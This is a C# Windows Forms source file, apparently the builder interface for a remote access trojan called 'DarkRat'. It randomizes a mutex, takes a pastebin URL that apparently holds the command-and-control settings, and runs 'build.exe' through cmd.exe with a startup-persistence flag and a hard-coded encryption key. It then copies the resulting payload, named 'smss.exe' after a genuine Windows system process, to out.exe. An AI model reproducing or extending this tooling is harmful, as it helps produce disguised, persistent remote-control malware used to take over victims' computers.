using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace DarkRatBuilderNet
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
          
            mutex.Text = RandomString(8);
        }


        private string RandomString(int Randomlenght)
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            var stringChars = new char[Randomlenght];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new String(stringChars);
        }




        private void Button3_Click(object sender, EventArgs e)
        {
            mutex.Text = RandomString(8);
        }


        private void Button1_Click(object sender, EventArgs e)
        {


            //builder.exe pastebin mutex startup enckey
            string strCmdText;
          //  string startupString;
    

            string currentDir =  System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\Misc";
            string buildString = "build.exe " + pastebinUrl.Text + " " + mutex.Text + " enable KQC";
            strCmdText = " /C cd "+ currentDir + " && "+ buildString;
            System.Diagnostics.Process.Start("cmd.exe", strCmdText);
            System.Threading.Thread.Sleep(1500);
            File.Copy(currentDir+"\\smss.exe", currentDir+"\\..\\out.exe", true);



        }
    }
}
